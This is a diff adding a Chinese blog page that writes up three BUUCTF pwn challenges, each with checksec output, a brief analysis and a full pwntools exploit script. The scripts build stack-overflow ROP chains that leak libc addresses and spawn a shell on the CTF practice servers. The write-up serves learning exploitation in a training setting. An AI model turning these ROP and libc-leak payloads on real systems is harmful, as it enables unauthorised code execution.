@@ -1,0 +1,651 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#33cc66">
+  <meta name="author" content="夏白">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="BUUCTF刷题[OGeek2019]babyropcheck,没有canary保护，nx保护开启排除shellcode可能性，FULL RELEO为地址随机化。: 12345Arch:     i386-32-littleRELRO:    Full RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x804">
+<meta property="og:type" content="article">
+<meta property="og:title" content="寒假pwn题第四天">
+<meta property="og:url" content="http://example.com/2023/02/13/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E5%9B%9B%E5%A4%A9/index.html">
+<meta property="og:site_name" content="夏白の博客">
+<meta property="og:description" content="BUUCTF刷题[OGeek2019]babyropcheck,没有canary保护，nx保护开启排除shellcode可能性，FULL RELEO为地址随机化。: 12345Arch:     i386-32-littleRELRO:    Full RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x804">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2023/02/13/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E5%9B%9B%E5%A4%A9/image-20230213215319893.png">
+<meta property="og:image" content="http://example.com/2023/02/13/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E5%9B%9B%E5%A4%A9/image-20230213215440021.png">
+<meta property="og:image" content="http://example.com/2023/02/13/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E5%9B%9B%E5%A4%A9/image-20230213215551011.png">
+<meta property="og:image" content="http://example.com/2023/02/13/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E5%9B%9B%E5%A4%A9/image-20230213220847435.png">
+<meta property="og:image" content="http://example.com/2023/02/13/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E5%9B%9B%E5%A4%A9/image-20230213220935498.png">
+<meta property="article:published_time" content="2023-02-13T13:46:25.000Z">
+<meta property="article:modified_time" content="2023-02-13T14:15:14.577Z">
+<meta property="article:author" content="夏白">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2023/02/13/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E5%9B%9B%E5%A4%A9/image-20230213215319893.png">
+  
+  
+  
+  <title>寒假pwn题第四天 - 夏白の博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>夏白の博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="寒假pwn题第四天"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-02-13 21:46" pubdate>
+          2023年2月13日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          33 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">寒假pwn题第四天</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="BUUCTF刷题"><a href="#BUUCTF刷题" class="headerlink" title="BUUCTF刷题"></a>BUUCTF刷题</h1><h3 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h3><p>check,没有canary保护，nx保护开启排除shellcode可能性，FULL RELEO为地址随机化。:</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><br><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Full</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br></code></pre></td></tr></table></figure>
+
+<p>主函数的思路大概是：生成一个随机数，把这个随机数作为参数传进sub_804871F()函数里，然后将该函数返回的结果作为参数再传进sub_80487D0()里</p>
+<img src="/2023/02/13/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E5%9B%9B%E5%A4%A9/image-20230213215319893.png" srcset="/img/loading.gif" lazyload class title="image-20230213215319893">
+
+<p>sprintf（）函数将生成的随机数a1加到了s[32]的数组中。这里题目有read函数，但是没有栈溢出的可能，读入buf之后，读取buf的长度，然后比较buf和s字符串的大小（比较长度为前v1个字符）。此时如果strncmp（）的结果不为0，则直接退出程序。因此我们第一个目的：使strncmp结果为0</p>
+<img src="/2023/02/13/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E5%9B%9B%E5%A4%A9/image-20230213215440021.png" srcset="/img/loading.gif" lazyload class title="image-20230213215440021">
+
+<p>sub_804871F()函数会将buf[7]作为参数传进来，将它的ASCII码比对，看到全程序中唯一一个存在栈溢出漏洞可能性的地方。但是必须满足a1的ASCII码值能达到栈溢出的大小。第二个目的：使a1的ASCII码值（sub_804871F()函数里的buf[7]的ASCII码值尽量大）</p>
+<img src="/2023/02/13/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E5%9B%9B%E5%A4%A9/image-20230213215551011.png" srcset="/img/loading.gif" lazyload class title="image-20230213215551011">
+
+<p>附上exp:</p>
+<p>参考文章:[(74条消息) BUUCTF–[OGeek2019]babyrop_Loτυs的博客-CSDN博客_[ogeek2019]babyrop](<a target="_blank" rel="noopener" href="https://blog.csdn.net/Invin_cible/article/details/121322885?ops_request_misc=%7B%22request_id%22:%22167629620016800222825803%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167629620016800222825803&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-121322885-null-null.142%5Ev73%5Einsert_down3,201%5Ev4%5Eadd_ask,239%5Ev1%5Econtrol&utm_term=buuctf">https://blog.csdn.net/Invin_cible/article/details/121322885?ops_request_misc=%7B%22request%5Fid%22%3A%22167629620016800222825803%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=167629620016800222825803&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-121322885-null-null.142^v73^insert_down3,201^v4^add_ask,239^v1^control&amp;utm_term=buuctf</a> babyrop&amp;spm&#x3D;1018.2226.3001.4187)</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-keyword">from</span> LibcSearcher import *<br>r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,25501)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>elf = ELF(<span class="hljs-string">&#x27;/mnt/hgfs/ubuntu共享文件夹/BUUCTF/pwnn2&#x27;</span>)<br>payload = <span class="hljs-string">&#x27;\x00&#x27;</span>+<span class="hljs-string">&#x27;\xff&#x27;</span><span class="hljs-number">*7</span><br>r.sendline(payload)<br>r.recvuntil(<span class="hljs-string">&quot;Correct\n&quot;</span>)<br>write_plt = elf.plt[<span class="hljs-string">&quot;write&quot;</span>]<br>write_got = elf.got[<span class="hljs-string">&quot;write&quot;</span>]<br>main_addr = 0x08048825<br>payload1 = b<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-number">*0</span>xe7+b<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-number">*4</span>+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)<br>r.sendline(payload1)<br>write_addr = u32(r.recv(4))<br><span class="hljs-built_in">print</span>(hex(write_addr))<br>libc = LibcSearcher(<span class="hljs-string">&quot;write&quot;</span>,write_addr)<br>libc_base = write_addr -  libc.dump(<span class="hljs-string">&quot;write&quot;</span>)<br>system_addr = libc_base+libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>bin_sh_addr = libc_base+libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br>r.sendline(payload)<br>r.recvuntil(<span class="hljs-string">&quot;Correct\n&quot;</span>)<br>payload2 = b<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-number">*0</span>xe7+b<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-number">*4</span>+p32(system_addr)+p32(0)+p32(bin_sh_addr)<br>r.sendline(payload2)<br>r.interactive()<br></code></pre></td></tr></table></figure>
+
+<h3 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h3><p>经典check:</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><br><span class="hljs-attr">RELRO:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span><br></code></pre></td></tr></table></figure>
+
+<p>跟那个32位的没啥区别,只是参数进栈方式不同，附上exp:</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><br><span class="hljs-comment">#p=process(&quot;level2_x64&quot;)</span><br><span class="hljs-attribute">p</span>=remote(&quot;node4.buuoj.cn&quot;,27665)<br><span class="hljs-attribute">pop_rdi_ret</span>=0x00000000004006b3<br><br><span class="hljs-attribute">system</span>=0x4004C0<br><span class="hljs-attribute">str_bin_sh</span>=0x600A90<br><br><span class="hljs-attribute">payload</span>=b&#x27;A&#x27;*(0x88)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(system)<br><br>p.recvuntil(<span class="hljs-string">&quot;:\n&quot;</span>)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h3 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="[HarekazeCTF2019]baby_rop"></a>[HarekazeCTF2019]baby_rop</h3><p>经典check:</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><br><span class="hljs-attr">RELRO:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span><br></code></pre></td></tr></table></figure>
+
+<p>shift+f12,查看关键字符串</p>
+<img src="/2023/02/13/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E5%9B%9B%E5%A4%A9/image-20230213220847435.png" srcset="/img/loading.gif" lazyload class title="image-20230213220847435">
+
+<p>双击，ctrl+x，进入反汇编代码：</p>
+<img src="/2023/02/13/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E5%9B%9B%E5%A4%A9/image-20230213220935498.png" srcset="/img/loading.gif" lazyload class title="image-20230213220935498">
+
+<p>ROPgadget查看返回地址，附上exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding = utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-comment">#from LibcSearcher import*</span><br> <br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>,arch = <span class="hljs-string">&#x27;i386&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>content = <span class="hljs-number">0</span><br>elf = ELF(<span class="hljs-string">&quot;babyrop2&quot;</span>)<br>lib = ELF(<span class="hljs-string">&quot;libc.so.6&quot;</span>)<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>	<span class="hljs-keyword">if</span> content == <span class="hljs-number">1</span>:<br>		p = process(<span class="hljs-string">&#x27;babyrop2&#x27;</span>)<br>	<span class="hljs-keyword">else</span>:<br>		p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27333</span>)<br>	<br>	main_addr = elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>	got_addr  = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>	plt_addr  = elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>	pop_rdi   = <span class="hljs-number">0x0400733</span><br>	pop_r15   = <span class="hljs-number">0x0400731</span><br>	format_   = <span class="hljs-number">0x0400770</span><br>	ret_addr  = <span class="hljs-number">0x04004d1</span><br>	<br>	payload   = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x20</span>+<span class="hljs-number">0x8</span>) + p64(pop_rdi) + p64(format_) + p64(pop_r15) + p64(got_addr) + p64(<span class="hljs-number">0</span>) + p64(plt_addr) + p64(main_addr)<br>	p.recvuntil(<span class="hljs-string">&quot;What&#x27;s your name? &quot;</span>)<br>	p.sendline(payload)<br>	write_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>	<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(write_addr))<br>	<br>	<span class="hljs-comment">#lib</span><br>	<br>	lib_write  = lib.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br>	lib_system = lib.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>	lib_binsh  = <span class="hljs-built_in">next</span>(lib.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br> <br>	base_addr   = write_addr - lib_write<br>	system_addr = base_addr + lib_system<br>	binsh_addr  = base_addr + lib_binsh<br>	<br>	payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x20</span>+<span class="hljs-number">0x8</span>) + p64(ret_addr)+ p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)<br>	p.recvuntil(<span class="hljs-string">&quot;What&#x27;s your name? &quot;</span>)<br>	p.sendline(payload)<br>	<br>	<br>	p.interactive()<br>main() <br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>寒假pwn题第四天</div>
+      <div>http://example.com/2023/02/13/寒假pwn题第四天/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>夏白</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年2月13日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/" title="寒假pwn题第三天">
+                        <span class="hidden-mobile">寒假pwn题第三天</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Study hard</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Day day up！</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
